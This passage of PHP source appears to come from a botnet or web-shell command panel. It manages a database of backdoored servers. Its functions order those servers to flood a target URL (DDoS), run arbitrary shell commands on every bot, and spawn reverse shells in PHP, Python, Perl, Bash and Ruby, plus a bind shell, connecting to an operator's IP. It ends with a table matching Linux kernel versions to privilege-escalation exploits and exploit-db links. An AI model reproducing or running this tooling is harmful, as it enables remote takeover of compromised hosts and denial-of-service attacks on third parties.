    'desc' => $node->getElementsByTagName('description')->item(0)->nodeValue,
    'link' => $node->getElementsByTagName('link')->item(0)->nodeValue,
    'date' => $node->getElementsByTagName('pubDate')->item(0)->nodeValue,
    );
    array_push($feed, $item);
    }
    $limit = 10;
    for($x=0;$x<$limit;$x++) {
    $title = str_replace(' & ', ' &amp; ', $feed[$x]['title']);
    $link = $feed[$x]['link'];
    $description = $feed[$x]['desc'];
    $date = date('d.m.y', strtotime($feed[$x]['date']));
    echo '<p><strong><a href="'.$link.'" title="'.$title.'">'.$title.'</a></strong><br />';
    echo '<small><em>Published '.$date.'</em></small></p>';
    echo '<p>'.$description.'</p>';
    }
}

function dos() {

    if(isset($_POST['url1']) && isset($_POST['botid1']) && isset($_POST['time1']) && isset($_POST['sup'])) {

$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
mysqli_select_db(SQL_DB, $conn);
$check = mysqli_query($conn,"SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['botid1'])." LIMIT 1");
$row = mysql_fetch_array($check);
if($row !== false) {

if($_POST['sup'] == 'kill') {

$source = conn($row['url'].'?_=system&__=uname');
if(strpos($source, md5(666))) {
$ch = curl_init();
if(USE_PROXY == 1) {
$curlConfig = array(
    CURLOPT_PROXY          => PROXY_IP.':'.PROXY_PORT,
    CURLOPT_PROXYTYPE      => CURLPROXY_SOCKS5,
    CURLOPT_URL            => $row['url'],
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => array(
        'kill' => '1'
    )
);
} else {
$curlConfig = array(
    CURLOPT_URL            => $row['url'],
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => array(
        'kill' => '1'
    )
);
}
curl_setopt_array($ch, $curlConfig);
$result = curl_exec($ch);
curl_close($ch);

echo '<br /><p>Killed all actions for id <b>'.$_POST['botid1'].'</b>.</p>';

} else {
    echo '<br /><p>Backdoor with id <b>'.htmlspecialchars($_POST['botid1']).'</b> don\'t support ddos.</p>';
}

        } elseif($_POST['sup'] == 'attack') {

$source = conn($row['url'].'?_=system&__=uname');
if(strpos($source, md5(666))) {
$ch = curl_init();
if(USE_PROXY == 1) {
$curlConfig = array(
    CURLOPT_PROXY          => PROXY_IP.':'.PROXY_PORT,
    CURLOPT_PROXYTYPE      => CURLPROXY_SOCKS5,
    CURLOPT_URL            => $row['url'],
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => array(
        'target' => $_POST['url1'],
        'time'   => $_POST['time1']
    )
);
} else {
$curlConfig = array(
    CURLOPT_URL            => $row['url'],
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => array(
        'target' => $_POST['url1'],
        'time'   => $_POST['time1']
    )
);
}

curl_setopt_array($ch, $curlConfig);
$result = curl_exec($ch);
curl_close($ch);

echo '<br /><p>Attacked '.$_POST['url1'].' for '.$_POST['time1']. ' seconds with bot id <b>'.$_POST['botid1'].'</b>.</p>';

} else {
    echo '<br /><p>Backdoor with id <b>'.htmlspecialchars($_POST['botid1']).'</b> don\'t support ddos.</p>';
}

        }

    
} else {
    echo '<br /><p>No shell found for id <b>'.htmlspecialchars($_POST['botid1']).'</b></p>';
}
}
}

function run() {

if(isset($_POST['cmd']) && isset($_POST['func'])) {

$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
mysqli_select_db(SQL_DB, $conn);
$rows = mysqli_query($conn,'SELECT * FROM `bots`', $conn);    

while($row = mysqli_fetch_assoc($rows)) {

$source = conn($row['url'].'?_=system&__=uname');
if(strpos($source, md5("#666#".date("h:d"))) && $_POST['func'] == 'system' || $_POST['func'] == 'eval' || $_POST['func'] == 'passthru' || $_POST['func'] == 'exec') {
$x = conn($row['url'].'?_='.$_POST['func'].'&__='.urlencode($_POST['cmd']));

$y = explode("{:|", $x);
echo '<p class=\'meta\'><b>'.htmlspecialchars($row['url']).'</b></p><pre>'.htmlspecialchars($y[1]).'</pre>';

}
}

}
}

function reverse_shell() {

    if(isset($_POST['ip']) && isset($_POST['port']) && isset($_POST['func']) && isset($_POST['id'])) {

    $conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
    mysqli_select_db(SQL_DB, $conn);

    $check = mysqli_query($conn,"SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['id'])." LIMIT 1");
    $row = mysql_fetch_array($check);
    if($row !== false) {


        if($_POST['func'] == 'php') {

            $cmd = 'php+-r+%27%24sock%3Dfsockopen%28%22'.urlencode($_POST['ip']).'%22%2C'.urlencode($_POST['port']).'%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27';
            conn($row[1].'?_='.PWN_PHP_METHOD.'&__='.$cmd);
            echo '<br /><p>PHP Reverse Shell Created - '.htmlspecialchars($_POST['ip']).':'.htmlspecialchars($_POST['port']).'</p>';

        }

        if($_POST['func'] == 'python') {

            $cmd = 'python+-c+%27import+socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22'.urlencode($_POST['ip']).'%22%2C'.urlencode($_POST['port']).'%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B+os.dup2%28s.fileno%28%29%2C1%29%3B+os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27';
            conn($row[1].'?_='.PWN_PHP_METHOD.'&__='.$cmd);
            echo '<br /><p>Python Reverse Shell Created - '.htmlspecialchars($_POST['ip']).':'.htmlspecialchars($_POST['port']).'</p>';

            
        }

        if($_POST['func'] == 'perl') {

            $cmd = 'perl+-e+%27use+Socket%3B%24i%3D%22'.urlencode($_POST['ip']).'%22%3B%24p%3D'.urlencode($_POST['ip']).'%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh+-i%22%29%3B%7D%3B%27';
            conn($row[1].'?_='.PWN_PHP_METHOD.'&__='.$cmd);
            echo '<br /><p>Perl Reverse Shell Created - '.htmlspecialchars($_POST['ip']).':'.htmlspecialchars($_POST['port']).'</p>';


        }

        if($_POST['func'] == 'bash') {

            $cmd = 'bash+-i+%3E%26+%2Fdev%2Ftcp%2F'.urlencode($_POST['ip']).'%2F'.urlencode($_POST['port']).'+0%3E%261';
            conn($row[1].'?_='.PWN_PHP_METHOD.'&__='.$cmd);
            echo '<br /><p>Bash Reverse Shell Created - '.htmlspecialchars($_POST['ip']).':'.htmlspecialchars($_POST['port']).'</p>';

        }

        if($_POST['func'] == 'ruby') {

            $cmd = 'ruby+-rsocket+-e%27f%3DTCPSocket.open%28%22'.urlencode($_POST['ip']).'%22%2C'.urlencode($_POST['ip']).'%29.to_i%3Bexec+sprintf%28%22%2Fbin%2Fsh+-i+%3C%26%25d+%3E%26%25d+2%3E%26%25d%22%2Cf%2Cf%2Cf%29%27';
            conn($row[1].'?_='.PWN_PHP_METHOD.'&__='.$cmd);
            echo '<br /><p>Ruby Reverse Shell Created - '.htmlspecialchars($_POST['ip']).':'.htmlspecialchars($_POST['port']).'</p>';

        }



} else {
    echo '<br/><p>No shell found for id <b>'.htmlspecialchars($_POST['id']).'</b></p>';
    }
}

}

function bind_shell() {

        if(isset($_POST['bindpassword']) && isset($_POST['bindport']) && isset($_POST['bindid'])) {

    $conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
    mysqli_select_db(SQL_DB, $conn);

    $check = mysqli_query($conn,"SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['bindid'])." LIMIT 1");
    $row = mysql_fetch_array($check);
    if($row !== false) {

    $cmd = 'php+-r+%27%24sockfd+%3D+socket_create%28AF_INET%2C+SOCK_STREAM%2C+SOL_TCP%29%3B+socket_bind%28%24sockfd%2C+%22127.0.0.1%22%2C+%22'.htmlspecialchars($_POST['bindport']).'%22%29%3B+socket_listen%28%24sockfd%2C15%29%3B+%24client+%3D+socket_accept%28%24sockfd%29%3B+socket_write%28%24client%2C+%22Enter+password%3A+%22%29%3B+%24input%3Dsocket_read%28%24client%2Cstrlen%28%22'.htmlspecialchars($_POST['bindpassword']).'%22%29%2B2%29%3Bif%28trim%28%24input%29%3D%3D%22'.htmlspecialchars($_POST['bindpassword']).'%22%29%7Bsocket_write%28%24client%2C%22%5Cn%5Cn%22%29%3Bsocket_write%28%24client%2Cshell_exec%28%22date+%2Ft+%26+time+%2Ft%22%29.%22%5Cn%22.shell_exec%28%22ver%22%29.shell_exec%28%22date%22%29.%22%5Cn%22.shell_exec%28%22uname+-a%22%29%29%3Bsocket_write%28%24client%2C%22%5Cn%5Cn%22%29%3Bwhile%281%29%7B%24commandPrompt%3D%22%5BCMD%5D%3E+%22%3B%24maxCmdLen%3D'.htmlspecialchars($_POST['bindport']).'%3Bsocket_write%28%24client%2C%24commandPrompt%29%3B%24cmd%3Dsocket_read%28%24client%2C%24maxCmdLen%29%3Bif%28%24cmd%3D%3DFALSE%29%7Becho+%22The+client+Closed+the+conection%21%22%3Bbreak%3B%7Dsocket_write%28%24client%2Cshell_exec%28%24cmd%29%29%3B%7D%7Delse%7Becho+%22Wrong+password%21%22%3Bsocket_write%28%24client%2C%22Wrong+password%21+%5Cn%5Cn%22%29%3B%7D%27';      
    conn($row[1].'?_='.PWN_PHP_METHOD.'&__='.$cmd);
    echo '<br /><p>Connection completed</p>';    

    } else {
    echo '<br/><p>No shell found for id <b>'.htmlspecialchars($_POST['bindid']).'</b></p>';
    }
}
}


function search_exploits($kernel) {

$exploits = array
(
array('2.2.', 'rip'),
array('2.2.24', 'mremap_pte', 'http://www.exploit-db.com/exploits/160/'),
array('2.4.', 'remap'),
array('2.4.10', 'brk', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'w00t'),
array('2.4.11', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.12', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.13', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.14', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.15', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.16', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'w00t'),
array('2.4.17', 'newlocal', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'uselib24', 'w00t'),
array('2.4.18', 'brk', 'km2', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'ptrace', 'ptrace_kmod', 'CVE-2007-4573' , 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'w00t'),
array('2.4.19', 'ave', 'brk', 'newlocal', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'ptrace', 'ptrace_kmod', 'CVE-2007-4573' , 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'w00t'),
array('2.4.20', 'ave', 'brk', 'mremap_pte', 'http://www.exploit-db.com/exploits/160/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'ptrace', 'ptrace_kmod', 'CVE-2007-4573' , 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'w00t'),
array('2.4.21', 'brk', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'ptrace', 'ptrace_kmod', 'CVE-2007-4573' , 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'w00t'),
array('2.4.22', 'brk', 'km2', 'loginx', 'loko', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'ptrace', 'ptrace_kmod', 'CVE-2007-4573' , 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'uselib24'),
array('2.4.23', 'loko', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.24', 'loko', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.25', 'mremap_pte', 'http://www.exploit-db.com/exploits/160/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'uselib24'),
array('2.4.26', 'mremap_pte', 'http://www.exploit-db.com/exploits/160/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.27', 'elfdump', 'mremap_pte', 'http://www.exploit-db.com/exploits/160/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'uselib24'),
array('2.4.28', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.29', 'elflbl', 'http://www.exploit-db.com/exploits/744/', 'expand_stack', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'smpracer', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'stackgrow2', 'uselib24'),
array('2.4.30', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.31', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.32', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.33', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.34', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.35', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.36', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.37', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.4', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.5', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.6', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.7', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.8', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.4.9', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'ptrace24', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
array('2.6.', 'newsmp', 'vconsole', 'CVE-2009-1046' ),
array('2.6.0', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.1', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.10', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'exp.sh', 'h00lyshit', 'CVE-2006-3626' , 'http://www.exploit-db.com/exploits/2013/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'krad', 'krad3', 'http://exploit-db.com/exploits/1397', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'stackgrow2', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'uselib24', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.11', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'h00lyshit', 'CVE-2006-3626' , 'http://www.exploit-db.com/exploits/2013/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'krad', 'krad3', 'http://exploit-db.com/exploits/1397', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'pwned', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.12', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'elfcd', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'h00lyshit', 'CVE-2006-3626' , 'http://www.exploit-db.com/exploits/2013/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
